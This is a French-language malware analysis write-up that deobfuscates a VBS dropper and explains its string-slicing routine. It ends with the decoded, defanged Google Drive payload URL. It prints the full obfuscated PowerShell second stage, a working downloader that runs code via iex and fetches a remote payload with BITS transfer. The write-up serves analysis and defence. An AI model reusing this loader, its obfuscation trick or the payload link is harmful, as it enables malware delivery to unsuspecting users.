Dans un premier temps on se retrouve avec un script en vbs.

```
$ cat b632a2ab492dbe0f71c18cab99b61bded82cbb66696f2d30c9bc354605ebb136.txt | head
Agerh0 = "."
'Plask Tinfolierne Udtmning Ingerlise Opbevaringsmediums
'Transparenter Risser kathode Finhval21
'Plenilune Religionsfrihederne Defilerings176 Produktionsplanerne Letterleaf
'Fodfolksregiments European46
'Vredt Svindlere
'Overforged Forsamlingsfrihederne potentialises
'Nonpareils carpogam cleats Forespoergselstidspunktet Omgangskredses
'mistruth Frimurer Trimpregneringens237 Coracii
'Fadllenes Blrehalse Vrtdyrene
```

On va d'abord virer tout les commentaires qui prennent de la place pour rien

![alt text](image-1.png)

On remarque qu'une fonction nommé ```Function Kork (numbersa)``` va tenté de reconstruire un second script

On extrait l'ensemble des strings qui nous intéresse.

```python
De6 = "function "
De6 = De6 + " Minimif ([String]$Asplanch){$Backingg = 8;For($Tricapsul=7; $Tricapsul -lt $Asplanch.Length-1; $Tricapsul+=$Backingg){$Tilvks=$Tilvks+$Asplanch.Substring($Tricapsul, 1)};$Tilvks;}$Tjrspri=Minimif 'ventekjhEpigramtfucusestDuplicepVrtdyrssSammenf:Boyards/Komiker/StickmedknottilrGuckedki ReprodvSkulkereRigsbib.RunderngProteseoTrimpreoAtrocoegAislemolSkrivesecaressk. E"
De6 = De6 + "mnetwcAnsttelounfleecmUncashe/TrevlemuBefragtcCyclama?SideroneMembranxEmeticapSkandero Afdelir Photost upaaag= HjlpeodBlowoffoGruppemwMyxomasnBabassulKarnappoTheoreta DifferdTabulat&Vrngbili ProngbdGrundst=Disprac1Dibblesnbrowsin-LngdegrcbilimpoTHydratiO UntestzOpfindebKvaliteYAbiturer EstranzkusinenABalteterFilmkunxVaagnedpObskuraCKursusizSeptendrPnitentL Armora6KnkketsB O"
De6 = De6 + "xyben0Hvlbnke4 BanguiRPacificHBemandiqOverdon4Wilsonk_birkeniGUniteabjudenlann overst0 FerrattMeditat ';$Tilvks01=Minimif 'Sierrasi KlubhueFrasortxKonomid ';$monopylae= $Tilvks01;$Thalas = Minimif ' Porphy\MassagesAcetylsyMisknowsOpvoksew SalzfeononinflwQuinari6Kageske4Udmejsl\SkjorteW madammiSpunsninHypoderdNamedbeoIntagliwRegie"
De6 = De6 + "tss ColickPSnapsflo DrkarmwPerichoeDeklassr MaidenSKaolinehBrudefreBolsterl IgangslSybilla\JatrophvUntenty1Kymogra.Telefil0Fugleun\ FiskekpSemblanoSidelinwKispuspeValetedrMarketesDumfounh CoraczeTecaactl BandollAcineti. proteieStngninxArendaleAfstraf ';            & ($Tilvks01) (Minimif 'Haendel$ModstanULugtes"
De6 = De6 + "anRusserblKlangfuiIlanaantElectroi VaservgReceiveaBrnebid2Indgaae=Kighost$UkultureParleyinTrenchcvShoaled: LejekawPredisciForsknin FodboldCaptainiJargoner biocid ') ;       .         ($Tilvks01) (Minimif ' orneri$RallencT UnvigihVelstanaWienervlHundredaSkarptasKontakt=Subfree$SmertetUOsmolovnProfesslFleeced"
De6 = De6 + "iSpytklat BehypoiOverfrogGennemsa Unjack2 Stigma+omsadli$NondenuTSuperimhSukkervaComposilMemoranaLlingtasBoneset ') ;      & ($Tilvks01) (Minimif ' Hyrekr$KvartseUAnnonactPlugginmTogrevimSwinglee BijektlKirkefei Sandflg Anisot nonopti=Begejst lystfar(Unfeign(BagganggStatsttwBengtelmAttractironspai WhitelywCovetisiSprgesknNodesk"
De6 = De6 + "r3Underin2Beskyld_ Leptocp CunninrGelejdeoKiwikiwclocuscaeRntgenbsChatties Baldyr Polyand-ResprmiFSttedom MandatePCanonesrStomatoomultihec Fornike NittensgravrstsGlasnetIBlyantsdasfreds=Requite$ Kultiv{PadderoPRendestIOlecranDSknders}Tragtni)Approba.KravletCUdlaansoForstanmkalkvrkmPanganeaBibelfan Therefd TreachLunctimpivadsksdnPalamabeJespers)Leadpro Besmitt-elbowbos Unbosop OpkbeslM"
De6 = De6 + "ilieuaiFortolktordskif Skdesyn[RekviemcBedragehAscendea PrograrSnobdom]Heindri3Bookmak4Tyranni ');  &       ($Tilvks01) (Minimif ' Projek$ BernichPrognosyTwinlikrSkulkere Naturet ImmingsUndlivecTekstndoCallianiDissimi Defiles=Holoste Frihold$VagtmesUMuscicotverificmNonscrimsubgenieTremblelRingeuniTekknergEssayis[ Segreg$ infamiU sirupst CottonmMonologmBellowseUndershlCuttingi AaremagGiveren. AprjtecMalpracoSnefygnuHu"
De6 = De6 + "lledanCalcanetFortuna-Brierya2 Borger]Stammre ');      .($Tilvks01) (Minimif 'Sprgere$LaanetsBgengivea EntusinUddanned Rotondl PrologyRenniogsLinjefa=android(OmstyrtTGulnbbeeSocagers HeterotForuren-TotemplP MalignaOuttyratKontinghSucurye Smaattr$LandsdoTBeholdnhHulkortaChampaklOmbrellaStandsnsCaptura)Benzins  Taalmo- StumpiAKlepladnLbedecid Whumml janskee(Serinev[ PligteI Vilkaan BopladtAtomknuPE"
De6 = De6 + "lskerstHypersprUnstran] Kanons:Nabonul:gasturbsUninnoci SumbulzDerodidePterost  Chinoo- ForkobeVulcaniqTempelr Timbale8 svovli)Partiti ') ;if ($Bandlys) {         &       $Thalas $hyretscoi;} else {;$Tilvks00=Minimif ' RysterSHalvmaatSkovhyta DumpinrPannelstEplotin-SpindhrB TagvaniTilintetBremsessSquali"
De6 = De6 + "dTDemioxarBegyndeaPredecrnMentalhsChromatfNonvisueOutgangrdrowsih Dolcian-machiavSAlfedano TeternuUnderforFritidsc DatopaeUdddepa  Sodsag$ ForyngT DrivanjMultinerEdwardisUnmobilpOpskrivrTerminsiTrstetr  homoge-SengeneDHelfabreFriseris ConsumtIrreguli oedelanAnretteaHolohedt TordneiforfatnoReadjusn Spence Inhaust$BattlerUHeterosnBundfrolAffindeiMusk"
De6 = De6 + "eletBenevoliAmpliatgNucleola Proecc2 Etymol ';  .  ($Tilvks01) (Minimif ' Monosy$TvangsaUSquarisnDriftsbl VerbaliElectictskranteiPaulasgg NervouaPseudon2 Recogn=Predisp$GkantereRequisin TypolovAktorsf:EfterstaHenvisspdeaktivp NotaridAlterbraUdspekut indkomaAnabolo ') ; & ($Tilvks01) (Minimif 'brdskriIGrydelamSpigerpp Erogeno JernmarBravuratGoodohu-StrstemMSnickleoFrenetidForsteruAnklagelUtricule sprogr DiskingBExpositiUnrestitSrbeskasIcositeT Fo"
De6 = De6 + "rkvar Fotohaa OpskrinSmeechksPrespecfForsorgeClubionrGuttera ') ;$Unlitiga2=$Unlitiga2+'\freezed.Kry';while (-not $Uret) {          &            ($Tilvks01) (Minimif 'Abbedie$HomodynU VariatrOmfavneeProsopitXiphipl=Strombu(RekalkuTMedarbee AnaglysUnlistytEinkorn-UncompePPalaeoeaRenpristOphicalhPomsmal Teterne$GranuleUCounternBuderuplDecoloniAmphophtKontroliAdoptivgDermencaShillal2Militrg)udlejen ') ;           &    "
De6 = De6 + "   ($Tilvks01) $Tilvks00;  &        ($Tilvks01) (Minimif 'BrnerigSRedisputMetalloastilenertrophobt Stikli-MucovisSGazingllNicolinePlectrue Quillsp reluct  Genose5Blamskv ');}      &          ($Tilvks01) (Minimif 'Skyggeb$LimbingEKeratombKasusinu PasteurVindigb Uncoach=Metateg SlidbaaGHeraldeeSlevenet Halvtr-UnsenatCLangtidoUnderben EmirertGrydelae KobraenCocinertJogging Appetit$EphemerURedenemn ComforlOverflaiDesignftOvergeniStormcegHyd"



De6 = De6 + "roscaDybblaa2Cuppasb ');    .($Tilvks01) (Minimif 'Bennela$ChancieDquadrijrSquamaeaPalatalwInfoskeaCaidkufrSottesetArtille Svuppen= Dehumi  Spring[UnjamheSpseudomyNarratrsLittondtForbikreParisermFlintov.forlydeC InhibioOverempnTrykfejv LeibnieAntabusrImponertBlodsud]Fedevar:Nabobyh:AuxiliaFDragesor BemestoskmtsommUnharmoBDonecklaSpuriousRentviseHornugl6Boloney4GainfulSPulsaartInddatarPrvelsliSemirurn IndsmugEctopla(Asyndet$Sil"
De6 = De6 + "icoaEKonvergbMeetlytuGennemsrAfstemn) hawaii ');     &            ($Tilvks01) (Minimif ' Itnonh$OphidseTnichelii FjaserlAabenplvSubtilikbegyndesGroundl2 augiti Skhiano=Respeci  Argume[OzarkitS Blennoy ArbejdsFinindstVowersie FanefjmReparat.KlenodiTAlachahe kontokxKyphositSelvtil.BestrbeE KlbrignJournalcGestikuo farewedTelefoniReservanSteroidgStjgene] Forsyt: Fi"
De6 = De6 + "lagr: UnoverAAmpulskSKapacitCssterstI dropskIkalewiv.PteroidGelektroe BaldritGennemlSSubjecttAlmindergeorassiAutarchnStetoskg gennem(Eksamen$ TessieD ReagenrHnsletvaRringenwKonditeaTrinflgrdidaktitKonnyci)Monitor ');        .     ($Tilvks01) (Minimif 'Magnumf$LavishiABayrersm CinchoaExpetibiExtremi=Sunrose$DuetsafT Rummeti Arbejdl Fa"
De6 = De6 + "talivTyrofelkAguardisHootmal2palliat.ApprehesProwutiuLandstrbSognebasEmbedmetSpuddler protociTarmenenOutbarkgAmfibie(Persons2Pillarw3Mrkedag9Aktions9Rjserne6Rrlgnin3Melipha,Ungrasp2Fotohan0Unorgan3Torpedo3Ametyst0Rearran)Affaire ');         . ($Tilvks01) $Amai;}"

print(De6)
```

![alt text](image.png)
```
function  Minimif ([String]$Asplanch)  {
    $Backingg = 8;
    For($Tricapsul = 7;
    $Tricapsul  - lt $Asplanch.Length - 1;
    $Tricapsul += $Backingg) {
        $Tilvks = $Tilvks + $Asplanch.Substring($Tricapsul, 1)
    };
    $Tilvks;
}

$Tjrspri = Minimif 'ventekjhEpigramtfucusestDuplicepVrtdyrssSammenf:Boyards/Komiker/StickmedknottilrGuckedki ReprodvSkulkereRigsbib.RunderngProteseoTrimpreoAtrocoegAislemolSkrivesecaressk. EmnetwcAnsttelounfleecmUncashe/TrevlemuBefragtcCyclama?SideroneMembranxEmeticapSkandero Afdelir Photost upaaag= HjlpeodBlowoffoGruppemwMyxomasnBabassulKarnappoTheoreta DifferdTabulat&Vrngbili ProngbdGrundst=Disprac1Dibblesnbrowsin-LngdegrcbilimpoTHydratiO UntestzOpfindebKvaliteYAbiturer EstranzkusinenABalteterFilmkunxVaagnedpObskuraCKursusizSeptendrPnitentL Armora6KnkketsB Oxyben0Hvlbnke4 BanguiRPacificHBemandiqOverdon4Wilsonk_birkeniGUniteabjudenlann overst0 FerrattMeditat ';
$Tilvks01 = Minimif 'Sierrasi KlubhueFrasortxKonomid ';
$monopylae = $Tilvks01;
$Thalas = Minimif ' Porphy\MassagesAcetylsyMisknowsOpvoksew SalzfeononinflwQuinari6Kageske4Udmejsl\SkjorteW madammiSpunsninHypoderdNamedbeoIntagliwRegietss ColickPSnapsflo DrkarmwPerichoeDeklassr MaidenSKaolinehBrudefreBolsterl IgangslSybilla\JatrophvUntenty1Kymogra.Telefil0Fugleun\ FiskekpSemblanoSidelinwKispuspeValetedrMarketesDumfounh CoraczeTecaactl BandollAcineti. proteieStngninxArendaleAfstraf ';
& ($Tilvks01) (Minimif 'Haendel$ModstanULugtesanRusserblKlangfuiIlanaantElectroi VaservgReceiveaBrnebid2Indgaae=Kighost$UkultureParleyinTrenchcvShoaled: LejekawPredisciForsknin FodboldCaptainiJargoner biocid ');
.         ($Tilvks01) (Minimif ' orneri$RallencT UnvigihVelstanaWienervlHundredaSkarptasKontakt=Subfree$SmertetUOsmolovnProfesslFleecediSpytklat BehypoiOverfrogGennemsa Unjack2 Stigma+omsadli$NondenuTSuperimhSukkervaComposilMemoranaLlingtasBoneset ');
& ($Tilvks01) (Minimif ' Hyrekr$KvartseUAnnonactPlugginmTogrevimSwinglee BijektlKirkefei Sandflg Anisot nonopti=Begejst lystfar(Unfeign(BagganggStatsttwBengtelmAttractironspai WhitelywCovetisiSprgesknNodeskr3Underin2Beskyld_ Leptocp CunninrGelejdeoKiwikiwclocuscaeRntgenbsChatties Baldyr Polyand-ResprmiFSttedom MandatePCanonesrStomatoomultihec Fornike NittensgravrstsGlasnetIBlyantsdasfreds=Requite$ Kultiv{PadderoPRendestIOlecranDSknders}Tragtni)Approba.KravletCUdlaansoForstanmkalkvrkmPanganeaBibelfan Therefd TreachLunctimpivadsksdnPalamabeJespers)Leadpro Besmitt-elbowbos Unbosop OpkbeslMilieuaiFortolktordskif Skdesyn[RekviemcBedragehAscendea PrograrSnobdom]Heindri3Bookmak4Tyranni ');
&       ($Tilvks01) (Minimif ' Projek$ BernichPrognosyTwinlikrSkulkere Naturet ImmingsUndlivecTekstndoCallianiDissimi Defiles=Holoste Frihold$VagtmesUMuscicotverificmNonscrimsubgenieTremblelRingeuniTekknergEssayis[ Segreg$ infamiU sirupst CottonmMonologmBellowseUndershlCuttingi AaremagGiveren. AprjtecMalpracoSnefygnuHulledanCalcanetFortuna-Brierya2 Borger]Stammre ');
.($Tilvks01) (Minimif 'Sprgere$LaanetsBgengivea EntusinUddanned Rotondl PrologyRenniogsLinjefa=android(OmstyrtTGulnbbeeSocagers HeterotForuren-TotemplP MalignaOuttyratKontinghSucurye Smaattr$LandsdoTBeholdnhHulkortaChampaklOmbrellaStandsnsCaptura)Benzins  Taalmo- StumpiAKlepladnLbedecid Whumml janskee(Serinev[ PligteI Vilkaan BopladtAtomknuPElskerstHypersprUnstran] Kanons:Nabonul:gasturbsUninnoci SumbulzDerodidePterost  Chinoo- ForkobeVulcaniqTempelr Timbale8 svovli)Partiti ');
if ($Bandlys)  {
    &       $Thalas $hyretscoi;
} else {;
    $Tilvks00 = Minimif ' RysterSHalvmaatSkovhyta DumpinrPannelstEplotin-SpindhrB TagvaniTilintetBremsessSqualidTDemioxarBegyndeaPredecrnMentalhsChromatfNonvisueOutgangrdrowsih Dolcian-machiavSAlfedano TeternuUnderforFritidsc DatopaeUdddepa  Sodsag$ ForyngT DrivanjMultinerEdwardisUnmobilpOpskrivrTerminsiTrstetr  homoge-SengeneDHelfabreFriseris ConsumtIrreguli oedelanAnretteaHolohedt TordneiforfatnoReadjusn Spence Inhaust$BattlerUHeterosnBundfrolAffindeiMuskeletBenevoliAmpliatgNucleola Proecc2 Etymol ';
    .  ($Tilvks01) (Minimif ' Monosy$TvangsaUSquarisnDriftsbl VerbaliElectictskranteiPaulasgg NervouaPseudon2 Recogn=Predisp$GkantereRequisin TypolovAktorsf:EfterstaHenvisspdeaktivp NotaridAlterbraUdspekut indkomaAnabolo ');
    & ($Tilvks01) (Minimif 'brdskriIGrydelamSpigerpp Erogeno JernmarBravuratGoodohu-StrstemMSnickleoFrenetidForsteruAnklagelUtricule sprogr DiskingBExpositiUnrestitSrbeskasIcositeT Forkvar Fotohaa OpskrinSmeechksPrespecfForsorgeClubionrGuttera ');
    $Unlitiga2 = $Unlitiga2 + '
                                                             reezed.Kry';
    while ( - not $Uret)  {
        &            ($Tilvks01) (Minimif 'Abbedie$HomodynU VariatrOmfavneeProsopitXiphipl=Strombu(RekalkuTMedarbee AnaglysUnlistytEinkorn-UncompePPalaeoeaRenpristOphicalhPomsmal Teterne$GranuleUCounternBuderuplDecoloniAmphophtKontroliAdoptivgDermencaShillal2Militrg)udlejen ');
        &       ($Tilvks01) $Tilvks00;
        &        ($Tilvks01) (Minimif 'BrnerigSRedisputMetalloastilenertrophobt Stikli-MucovisSGazingllNicolinePlectrue Quillsp reluct  Genose5Blamskv ');
    }

    &          ($Tilvks01) (Minimif 'Skyggeb$LimbingEKeratombKasusinu PasteurVindigb Uncoach=Metateg SlidbaaGHeraldeeSlevenet Halvtr-UnsenatCLangtidoUnderben EmirertGrydelae KobraenCocinertJogging Appetit$EphemerURedenemn ComforlOverflaiDesignftOvergeniStormcegHydroscaDybblaa2Cuppasb ');
    .($Tilvks01) (Minimif 'Bennela$ChancieDquadrijrSquamaeaPalatalwInfoskeaCaidkufrSottesetArtille Svuppen= Dehumi  Spring[UnjamheSpseudomyNarratrsLittondtForbikreParisermFlintov.forlydeC InhibioOverempnTrykfejv LeibnieAntabusrImponertBlodsud]Fedevar:Nabobyh:AuxiliaFDragesor BemestoskmtsommUnharmoBDonecklaSpuriousRentviseHornugl6Boloney4GainfulSPulsaartInddatarPrvelsliSemirurn IndsmugEctopla(Asyndet$SilicoaEKonvergbMeetlytuGennemsrAfstemn) hawaii ');
    &            ($Tilvks01) (Minimif ' Itnonh$OphidseTnichelii FjaserlAabenplvSubtilikbegyndesGroundl2 augiti Skhiano=Respeci  Argume[OzarkitS Blennoy ArbejdsFinindstVowersie FanefjmReparat.KlenodiTAlachahe kontokxKyphositSelvtil.BestrbeE KlbrignJournalcGestikuo farewedTelefoniReservanSteroidgStjgene] Forsyt: Filagr: UnoverAAmpulskSKapacitCssterstI dropskIkalewiv.PteroidGelektroe BaldritGennemlSSubjecttAlmindergeorassiAutarchnStetoskg gennem(Eksamen$ TessieD ReagenrHnsletvaRringenwKonditeaTrinflgrdidaktitKonnyci)Monitor ');
    .     ($Tilvks01) (Minimif 'Magnumf$LavishiABayrersm CinchoaExpetibiExtremi=Sunrose$DuetsafT Rummeti Arbejdl FatalivTyrofelkAguardisHootmal2palliat.ApprehesProwutiuLandstrbSognebasEmbedmetSpuddler protociTarmenenOutbarkgAmfibie(Persons2Pillarw3Mrkedag9Aktions9Rjserne6Rrlgnin3Melipha,Ungrasp2Fotohan0Unorgan3Torpedo3Ametyst0Rearran)Affaire ');
    . ($Tilvks01) $Amai;
}
```

On voit un bout de code 

```powershell
function  Minimif ([String]$Asplanch)  {
    $Backingg = 8;
    For($Tricapsul = 7;
    $Tricapsul  - lt $Asplanch.Length - 1;
    $Tricapsul += $Backingg) {
        $Tilvks = $Tilvks + $Asplanch.Substring($Tricapsul, 1)
    };
    $Tilvks;
}
```
Cette fonction permet de deobfusquer le reste du code

![alt text](image-3.png)

Dans la fonction mentionner plus haut la boucle for prend le dernier caractère de chaque groupe de 8, on fait pareil avec la regex.

![alt text](image-2.png)

On obtient donc une url Google Drive : https://drive.]google.]com/uc?export=download&id=1n-cTOzbYrzArxpCzrL6B04RHq4_Gjn0t 
